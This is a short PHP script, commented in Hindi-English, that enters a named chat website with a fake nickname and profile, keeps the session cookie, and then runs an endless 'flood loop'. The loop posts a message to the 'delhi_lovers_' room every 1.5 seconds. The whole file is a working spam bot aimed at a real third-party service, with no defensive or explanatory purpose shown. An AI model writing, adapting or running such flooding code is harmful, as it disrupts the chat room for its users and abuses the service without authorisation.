<?php
set_time_limit(0);
$cookie = "/tmp/cookie.txt";
$url = "https://talkwin.ct.ws/index.php"; // Main page jahan details dalte hain

// 1. Entry Step (Name aur Age ke saath)
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);

$entryData = [
    'name'   => 'Ankit', // Aapka nickname
    'age'    => '30',    // Aapki age
    'gender' => 'Male',
    'color'  => 'Black',
    'enter'  => 'Enter'
];

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($entryData));
curl_exec($ch);
curl_close($ch);

// 2. Flood Loop (Delhi Room ke liye)
while(true) {
    // Delhi Lovers room ka link
    $ch = curl_init("https://talkwin.ct.ws/room.php?room=delhi_lovers_");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "msg=Bot_Testing_Active&send=Send");
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    echo "Message Sent! ";
    usleep(1500000); // 1.5 second ka gap (Safety ke liye)
}
?>

